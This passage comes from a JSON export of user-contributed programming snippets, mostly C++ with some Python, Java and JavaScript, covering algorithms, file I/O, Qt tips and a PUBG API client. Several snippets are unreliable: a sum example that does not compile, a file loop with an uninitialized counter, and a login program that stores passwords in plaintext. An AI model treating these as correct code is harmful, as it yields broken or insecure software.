    "description": "{   \"region\": \"eu\",   \"defaultRegion\": \"eu\",   \"season\": \"2017-pre3\",   \"defaultSeason\": \"2017-pre3\",   \"match\": \"solo\",   \"lastUpdated\": \"2017-08-26T07:04:22.1761241Z\",   \"playerName\": \"fak3zito\",   \"performance\": {     \"killDeathRatio\": 3.9,     \"winRatio\": 12.59,     \"timeSurvived\": 172745.7,     \"roundsPlayed\": 143,     \"wins\": 18,     \"winTop10Ratio\": 0.38,     \"top10s\": 48,     \"top10Ratio\": 33.57,     \"losses\": 125,     \"winPoints\": 1862   },   \"skillRating\": {     \"rating\": 2274,     \"bestRating\": 2289.04,     \"bestRank\": 35   },   \"perGame\": {     \"damagePg\": 412.52,     \"headshotKillsPg\": 1,     \"healsPg\": 2.63,     \"killsPg\": 3.41,     \"moveDistancePg\": 3869.1,     \"revivesPg\": \"0\",     \"roadKillsPg\": 0.02,     \"teamKillsPg\": 0.01,     \"timeSurvivedPg\": 1208.01,     \"top10sPg\": 0.34   },   \"combat\": {     \"kills\": 488,     \"assists\": 34,     \"suicides\": 1,     \"teamKills\": 1,     \"headshotKills\": 143,     \"headshotKillRatio\": 0.29,     \"vehicleDestroys\": 10,     \"roadKills\": 3,     \"dailyKills\": 20,     \"weeklyKills\": 85,     \"roundMostKills\": 14,     \"maxKillStreaks\": 2,     \"weaponAcquired\": \"0\"   },   \"survival\": {     \"days\": 21,     \"longestTimeSurvived\": 2183.97,     \"mostSurvivalTime\": 2183.97,     \"avgSurvivalTime\": 1208.01   },   \"distance\": {     \"walkDistance\": 295931.8,     \"rideDistance\": 257349.8,     \"moveDistance\": 553281.6,     \"avgWalkDistance\": 2069.45,     \"avgRideDistance\": 1799.65,     \"longestKill\": 483.63   },   \"support\": {     \"heals\": 376,     \"revives\": \"0\",     \"boosts\": 427,     \"damageDealt\": 58990.98,     \"dBNOs\": \"0\"   },   \"rankData\": {     \"wins\": 518,     \"rating\": 263,     \"kills\": 59,     \"winPoints\": 518   } }\nnpm install -S pubg-api-redis\nconst {PubgAPI, PubgAPIErrors, REGION, SEASON, MATCH} = require('pubg-api-redis');  // If no Redis configuration it wont be cached const api = new PubgAPI({   apikey: 'XXXXX',   redisConfig: {     host: '127.0.0.1',     port: 6379,     expiration: 300, // Optional - defaults to 300.   }, });  api.getProfileByNickname('javilobo8')   .then((profile) => {     const data = profile.content;     const stats = profile.getStats({       region: REGION.ALL, // defaults to profile.content.selectedRegion       season: SEASON.EA2017pre3, // defaults to profile.content.defaultSeason       match: MATCH.SOLO // defaults to SOLO     });     console.log(stats);   });  api.getAccountBySteamID('76561198084956266')   .then((account) => {     console.log(account);   }); \n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 315,
    "keyword": null,
    "link": null,
    "title": " PWM Generator Blue Pill",
    "description": " /*    Author: &Iacute;caro Fernando   github: https://github.com/icarofcb      Date: 12/03/2021    /*        72E6(Mhz)     f = -----------          ps x of           ps: prescaler   of: overflow    */  #define pwm1 PA10    unsigned duty1     =       0;                  //armazena valor do duty cycle unsigned frequency =       2,                  //armazena op&ccedil;&atilde;o de frequ&ecirc;ncia          overflow  =   36000,                  //armazena valor de estouro          pscaler   =       2;                  //armazena valor de prescaler           void setup() {    pinMode(pwm1,    PWM);                      //sa&iacute;da para o pwm1    HardwareTimer timer(1);                      //seleciona Timer1   timer.setPrescaleFactor(pscaler);            //prescaler Timer1 = 1:2   timer.setOverflow(overflow);                 //Timer1 overflow = 36000   pwmWrite(pwm1, duty1);                       //inicializa PWM com duty1 de 0      timer.setPrescaleFactor(pscaler);            //atualiza prescaler   timer.setOverflow(overflow);                 //atualiza overflow    duty1 = overflow>>1;                         //inicia duty em 50%   pwmWrite(pwm1, duty1);                       //atualiza PWM                                                //f = (72E6) / (2 x 36000) = 1kHz                                           }  void loop() {     }\n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 316,
    "keyword": null,
    "link": null,
    "title": " Palindrome Linked List",
    "description": "#include<bits/stdc++.h>   using namespace std;     struct ListNode {     int val;     ListNode *next;     ListNode() : val(0), next(nullptr) {}     ListNode(int x) : val(x), next(nullptr) {}     ListNode(int x, ListNode *next) : val(x), next(next) {} };   // Function to find the mid of linked-list ListNode* find_middle(ListNode* head,int n)         {             ListNode *slow=head,*fast=head;             while(fast!=NULL && fast->next!=NULL)             {                 slow=slow->next;                 fast=fast->next->next;             }              if(n&1)                 return slow->next;             else                 return slow;         } // Function to Reverse the List using three pointers ListNode* reverse_link(ListNode* head)         {             ListNode *prev=NULL;             ListNode *curr=head;             ListNode *next=NULL;             while(curr!=NULL)             {                 next=curr->next;                 curr->next=prev;                 prev=curr;                 curr=next;             }             return prev;         } // Return if the Linked List is palindrome   bool isPalindrome(ListNode* head) {         if(head==NULL || head->next==NULL)             return true;                  ListNode *temp=head;         // Iterate to count odd/even         int n=0;         while(temp!=NULL)         {             temp=temp->next;             n++;         }         temp=head;         // Find the mid elemeny         ListNode *head_mid=find_middle(temp,n);         // Reverse the second half linked-list         ListNode *head_rev=reverse_link(head_mid);         // Verify first half and second half of linked-list are equivalent         while(head_rev!=NULL)         {                if(head->val!=head_rev->val)                 return false;                          head_rev=head_rev->next;             head=head->next;         }         return true;     }   // Driver Function int main(){     // Create nodes     ListNode one = ListNode(31);     ListNode two = ListNode(32);     ListNode three = ListNode(33);     ListNode four = ListNode(32);     ListNode five = ListNode(31);       ListNode *one_ptr = &one;      ListNode *two_ptr = &two;      ListNode *three_ptr = &three;      ListNode *four_ptr = &four;      ListNode *five_ptr = &five;        // Connect all the nodes     five_ptr->next = NULL;     one_ptr->next = &two;     two_ptr->next = &three;     three_ptr->next = &four;     four_ptr->next = &five;     ListNode* temp = &one;            // Call function to return bool if the list is palindrome or not     int result = isPalindrome(&one);       if(result == 1)             cout<<\"The value is Palindrome\\n\";     else         cout<<\"The value is NOT Palindrome\\n\";   return 0; }   \n#include<bits/stdc++.h>   using namespace std;   // Declaration of a single Node class Node { public:         int data;         Node(int d){             data = d;         }         Node *ptr; };   // Function that returns boolean value bool isPalin(Node* head){                  // Temp pointer         Node* slow= head;           // Create a stack         stack <int> s;             // First traversal to push all the elements to stack         while(slow != NULL){                 s.push(slow->data);                 slow = slow->ptr;         }           // Second Traversal to compare the stack and node         while(head != NULL ){                          int i=s.top();             s.pop();               // Compare data             if(head -> data != i){                 return false;             }         head=head->ptr;         }   return true; }   // Driver Function int main(){     // Create nodes     Node one = Node(31);     Node two = Node(32);     Node three = Node(33);     Node four = Node(34);     Node five = Node(35);       // Connect all the nodes     five.ptr = NULL;     one.ptr = &two;     two.ptr = &three;     three.ptr = &four;     four.ptr = &five;     Node* temp = &one;            // Call function to return bool if the list is palindrome or not     int result = isPalin(&one);       if(result == 1)             cout<<\"The value is True\\n\";     else         cout<<\"The value is False\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 317,
    "keyword": null,
    "link": null,
    "title": " Parse error. Expected a command name, got unquoted argument with text \"//\".",
    "description": "Solution: CMake comments start with #, not with // !  How ? Change any comment line starting with // to start with # instead.  // Create main executable   --->  #Create main executable   Example error: prashad@ubuntu:~/working_dir/bgslibrary/build$ make  -- Bulding bgslibrary_core SHARED CMake Error at /home/prashad/test/objecttracker_gerrit/BlobTracking.h:5:   Parse error.  Expected a command name, got unquoted argument with text   \"//\". Call Stack (most recent call first):   CMakeLists.txt:233 (include)  \n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 318,
    "keyword": null,
    "link": null,
    "title": " PascalName seperate strings",
    "description": "    string[] testCollection = new string[] { \"AutomaticTrackingSystem\", \"XSLT\", \"aCamelCaseWord\" };     foreach (string test in testCollection)     {         // if it is not the first character and it is uppercase         //  and the previous character is not uppercase then insert a space         var result = test.SelectMany((c, i) => i != 0 && char.IsUpper(c) && !char.IsUpper(test[i - 1]) ? new char[] { ' ', c } : new char[] { c });         Console.WriteLine(new String(result.ToArray()));     } \n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 319,
    "keyword": null,
    "link": null,
    "title": " Pascal triangle using c++",
    "description": "#include <iostream> using namespace std;  int main() {     int rows, coef = 1;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 0; i < rows; i++)     {         for(int space = 1; space <= rows-i; space++)             cout <<\"  \";          for(int j = 0; j <= i; j++)         {             if (j == 0 || i == 0)                 coef = 1;             else                 coef = coef*(i-j+1)/j;              cout << coef << \"   \";         }         cout << endl;     }      return 0; }\nint pascal(int row, int col) {   if (col == 0 || col == row) return 1;   else if(col == 1 || (col + 1) == row) return row;   else return pascal(row - 1, col - 1) + pascal(row - 1, col); }\n#include <iostream> using namespace std;   int fact(int num){     int factorial = 1;     for (int i = 2; i <= num; i++)     {         factorial = factorial * i;     }     return factorial; }  int main(){     int n;     cout << \"Enter number of rows: \";     cin >> n;      for (int i = 0; i < n; i++)     {         for (int j = 0; j <=i; j++)         {             cout << fact(i) / (fact(j) * fact(i - j)) << \" \";         }         cout << endl;     }      }\n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 320,
    "keyword": null,
    "link": null,
    "title": " Plus (programming language)",
    "description": "Similar to PASCAL\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 321,
    "keyword": null,
    "link": null,
    "title": " Poland",
    "description": "home of daddy errichto :) \npoland\nstd::string Poland = Poland;\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 322,
    "keyword": null,
    "link": null,
    "title": " Polycarp found a rectangular table consisting of n rows and m columns. He noticed that each cell of the table has its number, obtained by the following algorithm \"by columns\": codeforces solution",
    "description": "5 1 1 1 2 2 3 3 5 11 100 100 7312 1000000 1000000 1000000000000 \n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 323,
    "keyword": null,
    "link": null,
    "title": " Power Function in C/C++",
    "description": "pow(x,y);  Given two numbers base (x) and exponent (y), pow() function finds x raised to the power of y. \n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 324,
    "keyword": null,
    "link": null,
    "title": " Powershell can parallel threads update the same array",
    "description": "$logNames.count  10  Measure-Command {      $logs = $logNames | ForEach-Object -Parallel {         Get-WinEvent -LogName $_ -MaxEvents 5000 2>$null     } -ThrottleLimit 10 }  TotalMilliseconds : 115994.3 (1 minute 56 seconds) $logs.Count 50000   Measure-Command {     $logs = $logNames | ForEach-Object {         Get-WinEvent -LogName $_ -MaxEvents 5000 2>$null     }  }  TotalMilliseconds : 229768.2364 (3 minutes 50 seconds) $logs.Count 50000\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 325,
    "keyword": null,
    "link": null,
    "title": " Pretty Print c++ chegg",
    "description": "1-  0  0  1  0   1  0  0  0   0  0  0  1   0  1  0  0   2-  0  1  0  0   0  0  0  1   1  0  0  0   0  0  1  0 \n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 326,
    "keyword": null,
    "link": null,
    "title": " Print Decimal to binary using stack",
    "description": "#include<iostream> #include<stack> using namespace std; void dec_to_bin(int number) {    stack<int> stk;    while(number > 0) {       int rem = number % 2; //take remainder       number = number / 2;       stk.push(rem);    }    while(!stk.empty()) {       int item;       item = stk.top();       stk.pop();       cout << item;    } } main() {    int num;    cout << \"Enter a number: \";    cin >> num;    dec_to_bin(num); }\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 327,
    "keyword": null,
    "link": null,
    "title": " Print Floyd's Triangle",
    "description": "#include <iostream> using namespace std;  int main() {     int rows, number = 1;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 1; i <= rows; i++)     {         for(int j = 1; j <= i; ++j)         {             cout << number << \" \";             ++number;         }          cout << endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 328,
    "keyword": null,
    "link": null,
    "title": " Print frequencies of individual words in a string",
    "description": "void printFrequency(string str) {     map<string, int> FW;     stringstream s(str);      string Word;      while (s >> Word)         FW[Word]++;     for (auto m : FW)         cout << m.first << \" -> \" << m.second << \"\\n\"; }     // Input: One Two Three One Three    \t// Output One -> 2     //        Three -> 2     //        Two -> 1\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 329,
    "keyword": null,
    "link": null,
    "title": " Print value of data in c++",
    "description": "#include<iostream> using namespace std; int main() {     int num=10;     cout<<\"The Value of 'num' is \"<<num;     cout<<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:00.000Z"
  },
  {
    "id": 330,
    "keyword": null,
    "link": null,
    "title": " Priority Queue using Min Heap in c++",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\n#include <bits/stdc++.h> using namespace std;    int main () {         priority_queue <int> pq;     pq.push(5);     pq.push(1);     pq.push(10);     pq.push(30);     pq.push(20);           while (pq.empty() == false)     {         cout << pq.top() << \" \";         pq.pop();     }       return 0; }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 331,
    "keyword": null,
    "link": null,
    "title": " Python ord()",
    "description": "chr()\n# The ord() function returns an integer representing the Unicode character. res = ord('A') print(res) # output 65\nif x==1 or y==1:   print(x,y)\n'''note the integer representation of unicode character  of capital letters and small letters are completely different'''  # example print( ord('A') ) # output 65 print( ord('a') ) # output 97\nprint(chr(97)) print(ord('a'))\nprint('Unicode value of lower case alphabet a is ', ord('a')) # lower case alphabet  print('Unicode value of bumber 5 is ', ord('5')) # Number print('Unicode value of symobol $ is ', ord('$')) # dollar print('Unicode value of upper case alphabet A is ', ord('A')) # Upper case alphabet print('Unicode value of zero is ', ord('0')) # Number Zero \n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 332,
    "keyword": null,
    "link": null,
    "title": " QT error: invalid use of 'this' outside of a non-static member function",
    "description": "/**  * your function may not be part of an object  * didn't you forget how to declare a member function?  */ returnType className::function_name(type arg1, type arg2, type argN){ \t//any code }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 333,
    "keyword": null,
    "link": null,
    "title": " QT form doesn't take changes",
    "description": "delete your ui_nameOfUi.h then rebuild your whole project if(not_working){ \tclose QT; \tdelete projectName.pro.user;     delete ui_nameOfUi.h;     relaunch QT on your project;     reconfigure your project;     rebuild your whole project; }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 334,
    "keyword": null,
    "link": null,
    "title": " QT hide/show label",
    "description": "void MainWindow::display()  { \tlabel->setVisible(!label->isVisible());// Set the status as the opposite }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 335,
    "keyword": null,
    "link": null,
    "title": " QT hide show label",
    "description": "void MainWindow::display()  { \tlabel->setVisible(!label->isVisible());// Set the status as the opposite }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 336,
    "keyword": null,
    "link": null,
    "title": " QT show/hide label",
    "description": "void MainWindow::display()  { \tlabel->setVisible(!label->isVisible());// Set the status as the opposite }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 337,
    "keyword": null,
    "link": null,
    "title": " QT show hide label",
    "description": "void MainWindow::display()  { \tlabel->setVisible(!label->isVisible());// Set the status as the opposite }\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 338,
    "keyword": null,
    "link": null,
    "title": " Qt asynchronous HTTP request",
    "description": "QNetworkAccessManager *manager = new QNetworkAccessManager(this); connect(manager, &QNetworkAccessManager::finished,         this, &MyClass::replyFinished);  manager->get(QNetworkRequest(QUrl(\"http://qt-project.org\")));\n",
    "reg_date": "2021-10-12T11:37:01.000Z"
  },
  {
    "id": 339,
    "keyword": null,
    "link": null,
    "title": " Quick Sort in c++",
    "description": "#include <bits/stdc++.h>  using namespace std;        void swap(int* a, int* b)   {       int t = *a;       *a = *b;       *b = t;   }       int partition (int arr[], int low, int high)   {       int pivot = arr[high];       int i = (low - 1);          for (int j = low; j <= high - 1; j++)       {                 if (arr[j] < pivot)           {               i++;               swap(&arr[i], &arr[j]);           }       }       swap(&arr[i + 1], &arr[high]);       return (i + 1);   }       void quickSort(int arr[], int low, int high)   {       if (low < high)       {                    int pi = partition(arr, low, high);               quickSort(arr, low, pi - 1);           quickSort(arr, pi + 1, high);       }   }       void printArray(int arr[], int size)   {       int i;       for (i = 0; i < size; i++)           cout << arr[i] << \" \";       cout << endl;   }       int main()   {       int arr[] = {10, 7, 8, 9, 1, 5};       int n = sizeof(arr) / sizeof(arr[0]);       quickSort(arr, 0, n - 1);       cout << \"Sorted array: \\n\";       printArray(arr, n);       return 0;   }  \n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 340,
    "keyword": null,
    "link": null,
    "title": " REFERENCE C++",
    "description": "// function definition to swap the values. void swap(int &x, int &y) {    int temp;    temp = x; /* save the value at address x */    x = y;    /* put y into x */    y = temp; /* put x into y */       return; }\nint& r = i; \n#include <iostream> using namespace std;  // function declaration void swap(int &x, int &y);  int main () {    // local variable declaration:    int a = 100;    int b = 200;      cout << \"Before swap, value of a :\" << a << endl;    cout << \"Before swap, value of b :\" << b << endl;     /* calling a function to swap the values using variable reference.*/    swap(a, b);     cout << \"After swap, value of a :\" << a << endl;    cout << \"After swap, value of b :\" << b << endl;      return 0; }\nValue of i : 5 Value of i reference : 5 Value of d : 11.7 Value of d reference : 11.7 \n#include <iostream>   using namespace std;   int main () {    // declare simple variables    int    i;    double d;      // declare reference variables    int&    r = i;    double& s = d;        i = 5;    cout << \"Value of i : \" << i << endl;    cout << \"Value of i reference : \" << r  << endl;      d = 11.7;    cout << \"Value of d : \" << d << endl;    cout << \"Value of d reference : \" << s  << endl;        return 0; }\n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 341,
    "keyword": null,
    "link": null,
    "title": " RLE Encoding/Compression c++",
    "description": "#include <iostream> #include <string> using namespace std;   // Perform Run Length Encoding (RLE) data compression algorithm // on string str string encode(string str) {     // stores output string     string encoding = \"\";     int count;       for (int i = 0; str[i]; i++)     {         // count occurrences of character at index i         count = 1;         while (str[i] == str[i + 1])             count++, i++;           // append current character and its count to the result         encoding += to_string(count) + str[i];     }       return encoding; }   int main() {     string str = \"ABBCCCD\";       cout << encode(str);       return 0; } \n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 342,
    "keyword": null,
    "link": null,
    "title": " Radix Sort in c++",
    "description": "#include <iostream>  using namespace std;      int getMax(int arr[], int n)  {      int mx = arr[0];      for (int i = 1; i < n; i++)          if (arr[i] > mx)              mx = arr[i];      return mx;  }      void countSort(int arr[], int n, int exp)  {      int output[n];      int i, count[10] = { 0 };              for (i = 0; i < n; i++)          count[(arr[i] / exp) % 10]++;             for (i = 1; i < 10; i++)          count[i] += count[i - 1];           for (i = n - 1; i >= 0; i--) {          output[count[(arr[i] / exp) % 10] - 1] = arr[i];          count[(arr[i] / exp) % 10]--;      }         for (i = 0; i < n; i++)          arr[i] = output[i];  }       void radixsort(int arr[], int n)  {       int m = getMax(arr, n);             for (int exp = 1; m / exp > 0; exp *= 10)          countSort(arr, n, exp);  }      void print(int arr[], int n)  {      for (int i = 0; i < n; i++)          cout << arr[i] << \" \";  }      int main()  {      int arr[] = { 170, 45, 75, 90, 802, 24, 2, 66 };      int n = sizeof(arr) / sizeof(arr[0]);                radixsort(arr, n);      print(arr, n);      return 0;  }\n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 343,
    "keyword": null,
    "link": null,
    "title": " Random number in set range",
    "description": "#include <iostream>  #include <ctime>  #include <cstdlib>  using namespace std;  int main()  {      srand((unsigned)time(0));      int random_integer;      int lowest=1, highest=10;      int range=(highest-lowest)+1;      for(int index=0; index<20; index++){          random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));          cout << random_integer << endl;      }  }\n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 344,
    "keyword": null,
    "link": null,
    "title": " Read in three numbers, and calculate the sum. Output the sum as an integer. in c visual studio",
    "description": "include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 345,
    "keyword": null,
    "link": null,
    "title": " Read multiple files(.txt) c++",
    "description": "#include <sstream> #include <iostream> #include <string>  using namespace std; int main() { \tstring filename; \tostringstream ss; \tfilename=\"data_\"; \tfor(int i;i<2;i++) \t{ \tss << filename << i; \tFILE * f = fopen (ss.str(), \"r\"); \t\t\t if (NULL != f) \t\t\t { \t\t\t\t ///.....some work \t\t\t } \t\t\t else \t\t\t printf (\"Could not open the file\\n\"); \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 346,
    "keyword": null,
    "link": null,
    "title": " Reading From A File In C++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n/ fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    std::fstream fs;   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    fs.close();    return 0; }\nint a, b;      ifstream bd;  myfile.open(\"file.txt\");  if (myfile.is_open()) \twhile (bd >> a >> b)     \tcout << a << b << endl;  else cout << \"ERROR\";\n#include <iostream> #include <fstream> using namespace std; int main() { \tfstream my_file; \tmy_file.open(\"my_file.txt\", ios::in); \tif (!my_file) { \t\tcout << \"No such file\"; \t} \telse { \t\tchar ch;  \t\twhile (1) { \t\t\tmy_file >> ch; \t\t\tif (my_file.eof()) \t\t\t\tbreak;  \t\t\tcout << ch; \t\t}  \t} \tmy_file.close(); \treturn 0; } \n",
    "reg_date": "2021-10-12T11:37:02.000Z"
  },
  {
    "id": 347,
    "keyword": null,
    "link": null,
    "title": " Rectangle Cutting (1744) CSES C++",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {   int w, h;   cin >> w >> h;   vector<vector<int>> dp(w+1,vector<int>(h+1));   for (int i = 0; i <= w; i++) {     for (int j = 0; j <= h; j++) {       if (i == j) { \tdp[i][j] = 0;       } else { \tdp[i][j] = 1e9; \tfor (int k = 1; k < i; k++) { \t  dp[i][j] = min(dp[i][j], dp[k][j]+dp[i-k][j]+1); \t} \tfor (int k = 1; k < j; k++) { \t  dp[i][j] = min(dp[i][j], dp[i][k]+dp[i][j-k]+1); \t}       }     }   }   cout << dp[w][h] << endl; }\n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 348,
    "keyword": null,
    "link": null,
    "title": " Rectangle area hackerrank solution in c++",
    "description": "#include <iostream>  using namespace std; /*  * Create classes Rectangle and RectangleArea  */ class Rectangle{     protected:         int width;         int height;      public:         virtual void display() const{             cout<< width <<' ' << height << endl;         } }; class RectangleArea : public Rectangle {     public:         void display() const override {             cout << (width * height) << endl;         }         void read_input(){             cin >> width >> height;         } };  int main() {     /*      * Declare a RectangleArea object      */     RectangleArea r_area;          /*      * Read the width and height      */     r_area.read_input();          /*      * Print the width and height      */     r_area.Rectangle::display();          /*      * Print the area      */     r_area.display();          return 0; }\n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 349,
    "keyword": null,
    "link": null,
    "title": " Redragon m609 weight",
    "description": "141 Grams \n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 350,
    "keyword": null,
    "link": null,
    "title": " Register code  c++",
    "description": "#include <iostream> #include <string> #include <stdlib.h> #include <fstream>  using namespace std;   void mainmenu();   int choice;  bool cinfail;  int confirmation;  string username, password, password2;  void writetofile(string username){     ofstream writefile;     string file = username+\".txt\";     writefile.open(file.c_str());     writefile << password;     writefile.close();     mainmenu(); }  void login(){     cout << \"You are being logged in!\";}   void registerpassword(){     cout << \"Please enter the password:\" << endl;     cin >> password;     cout << \"Please renter your password:\" << endl;     cin >> password2;     if (password == password2){         cin.clear();         cin.ignore(10000,'\\n');         writetofile(username);         exit(1);     }     else;{         cout << \"Sorry invalid\" << endl;         registerpassword();     }}   void registerme(){     cout << \"Please enter your username: \" << endl;     getline(cin, username);     cout << \"\\nUsername -  \\\"\"<< username << \"\\\"\\nConfirm? \\n\\n[1] Yes\\n[2] No\" << endl;     cin >> confirmation;     if (confirmation == 1){         registerpassword();     }      else; {         cout << \"Sorry invalid input, Please try again\" << endl;         cin.clear();         cin.ignore(10000,'\\n');         registerme();     }}   void exit(){     exit(0);}  void mainmenu(){ cout << \"Hello, Would you like to log in or register\\n[1] Login\\n[2] Register\\n[3] Exit\" <<endl; cin >> choice; do{     cinfail = cin.fail();     cin.clear();     cin.ignore(10000,'\\n');      }while(cinfail == true);{         switch(choice){             case 1:                 login();                 break;              case 2:                 registerme();                 break;              case 3:                 exit();}}}   main(){  mainmenu();  } \n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 351,
    "keyword": null,
    "link": null,
    "title": " Remove the jth object from the subset",
    "description": " A &= &sim;(1 << j)  \n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 352,
    "keyword": null,
    "link": null,
    "title": " Reorganize String",
    "description": "#include<iostream> #include<string> #include<algorithm> #include<unordered_map> #include<queue> using namespace std; class Solution { public:     string reorganizeString(string s) {         unordered_map<char, int> um;         priority_queue<pair<int, char>> pq;         string output = \"\";          for (auto i : s)             um[i]++;          for (auto &i : um)             pq.push({i.second, i.first});          while (pq.size() > 1) {             auto top1 = pq.top(); pq.pop();             auto top2 = pq.top(); pq.pop();              output += top1.second;             output += top2.second;              if (--top1.first > 0){                 pq.push(top1);             }             if (--top2.first > 0){                 pq.push(top2);             }         }          if (pq.size()) {             if (pq.top().first == 1)                 output += pq.top().second;             else                 return \"\";         }         return output;     } }; int main(){   string s = \"aaaaaccbbb\";   Solution o;   cout<<o.reorganizeString(s); }  # ./a.out abacabacba\n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 353,
    "keyword": null,
    "link": null,
    "title": " Resize method in c++ for arrays",
    "description": "void resize() {     size_t newSize = size * 2;     int* newArr = new int[newSize];      memcpy( newArr, arr, size * sizeof(int) );      size = newSize;     delete [] arr;     arr = newArr; }\n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 354,
    "keyword": null,
    "link": null,
    "title": " Resize vector c++",
    "description": "vector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5)));\ndp.resize(n+1,vector<vector<int>>(n+1,vector<int>(n+1,-1))); \nThe C++ function std::vector::resize() changes the size of vector. If n is smaller than current size then extra elements are destroyed.  If n is greater than current container size then new elements are inserted at the end of vector.  If val is specified then new elements are initialed with val.\nstd::vector<int> a = {1, 2}; std::vector<int> b = {3, 4, 5}; a.insert(a.end(), b.begin(), b.end()); // a = {1, 2, 3, 4, 5}\nstd::vector<int> vec = {1, 2, 3}; vec.resize(2); // {1, 2} vec.resize(4); // {1, 2, 0, 0,} vec.resize(6, 9);  // {1, 2, 0, 0, 9, 9}\nresize (size_type n, const value_type& val);  The resize() method (and passing argument to constructor is equivalent to that)    will insert or delete appropriate number of elements to the vector to make it  given size (it has optional second argument to specify their value). \n",
    "reg_date": "2021-10-12T11:37:03.000Z"
  },
  {
    "id": 355,
    "keyword": null,
    "link": null,
    "title": " Restart the computer in c++ after the default time (30) seconds. (Windows)",
    "description": "// Restart the computer in Windows OS after the default time (30) seconds. // This code was done by Abdulellah Alwainany (YEMEN)  #include<stdlib.h> int main() {   // This method (system) uses the text inside these (\"\") as a CMD command and run it in the CM   // You can use it for any operation.     system(\"C:\\\\Windows\\\\System32\\\\shutdown /r\");     return 0; }\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 356,
    "keyword": null,
    "link": null,
    "title": " Reverse a linked list c++",
    "description": "// O(n) time & O(n) space function reverse(head) {   if (!head || !head.next) {     return head;   }   let tmp = reverse(head.next);   head.next.next = head;   head.next = undefined;   return tmp; } \nclass LinkedList {         static Node head;         static class Node {             int data;          Node next;             Node(int d)          {              data = d;              next = null;          }      }         /* Function to reverse the linked list */     Node reverse(Node node)      {          Node prev = null;          Node current = node;          Node next = null;          while (current != null) {              next = current.next;              current.next = prev;              prev = current;              current = next;          }          node = prev;          return node;      }         // prints content of double linked list      void printList(Node node)      {          while (node != null) {              System.out.print(node.data + \" \");              node = node.next;          }      }         public static void main(String[] args)      {          LinkedList list = new LinkedList();          list.head = new Node(85);          list.head.next = new Node(15);          list.head.next.next = new Node(4);          list.head.next.next.next = new Node(20);             System.out.println(\"Given Linked list\");          list.printList(head);          head = list.reverse(head);          System.out.println(\"\");          System.out.println(\"Reversed linked list \");          list.printList(head);      }  } \nclass recursion {  \tstatic Node head; // head of list  \tstatic class Node {  \t\tint data;  \t\tNode next;  \t\tNode(int d)  \t\t{   data = d;  \t\t\tnext = null; \t} }  \tstatic Node reverse(Node head)  \t{  \t\tif (head == null || head.next == null)  \t\t\treturn head;  \t\t/* reverse the rest list and put the first element          at the end */ \t\tNode rest = reverse(head.next);  \t\thead.next.next = head;  \t\t/* tricky step -- see the diagram */     \thead.next = null;  \t\t/* fix the head pointer */ \t\treturn rest;  \t}  /* Function to print linked list */ \tstatic 